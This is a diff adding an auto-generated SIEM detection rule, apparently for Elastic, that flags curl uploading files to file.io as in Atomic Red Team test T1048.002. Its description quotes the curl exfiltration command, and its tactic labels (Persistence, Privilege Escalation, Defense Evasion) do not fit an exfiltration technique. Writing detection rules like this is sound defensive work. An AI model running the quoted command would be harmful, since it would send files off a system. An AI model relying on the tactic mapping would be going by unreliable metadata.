@@ -1,0 +1,39 @@
+[rule]
+author = [ "AtomicRedTeam-Automation",]
+description = "Detection for specific test 'Exfiltrate data HTTPS using curl windows' (GUID: 1cdf2fb0-51b6-4fd8-96af-77020d5f1bf0) of technique T1048.002 (Exfiltration Over Alternative Protocol - Exfiltration Over Asymmetric Encrypted Non-C2 Protocol). Test Description: Exfiltrate data HTTPS using curl to file share site file.io. Command/Steps: #{curl_path} -k -F \\\"file=@#{input_file}\\\" https://file.io/\n"
+from = "now-9m"
+rule_id = "e380e7df-8e26-4d94-9ebb-fea5b686b9eb"
+language = "kql"
+name = "Atomic Test: T1048.002 - Exfiltrate data HTTPS using curl windows"
+output_index = ".siem-signals-default"
+references = [ "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/refs/heads/master/atomics/T1048.002/T1048.002.yaml",]
+risk_score = 50
+severity = "medium"
+tags = [ "AtomicRedTeam", "T1048.002", "1cdf2fb0-51b6-4fd8-96af-77020d5f1bf0", "windows",]
+type = "query"
+query = "(process.name : (\\\"cmd.exe\\\", \\\"cmmon32.exe\\\") OR process.parent.name : (\\\"cmd.exe\\\", \\\"cmmon32.exe\\\")) AND process.command_line : \\\"*C:\\\\Windows\\\\System32\\\\Curl.exe*\\\" AND process.command_line : \\\"*https://file.io/*\\\""
+version = 1
+index = [ "logs-endpoint.events.*", "winlogbeat-*", "logs-windows.*", "logs-linux.*", "logs-macos.*",]
+[[rule.threat]]
+framework = "MITRE ATT&CK"
+[[rule.threat.technique]]
+id = "T1048.002"
+name = "Exfiltrate data HTTPS using curl windows"
+reference = "https://attack.mitre.org/techniques/T1048/002"
+
+[[rule.threat.tactic]]
+id = "TA0003"
+name = "Persistence"
+reference = "https://attack.mitre.org/techniques/T1048/002"
+
+[[rule.threat.tactic]]
+id = "TA0004"
+name = "Privilege Escalation"
+reference = "https://attack.mitre.org/techniques/T1048/002"
+
+[[rule.threat.tactic]]
+id = "TA0005"
+name = "Defense Evasion"
+reference = "https://attack.mitre.org/techniques/T1048/002"
+
+
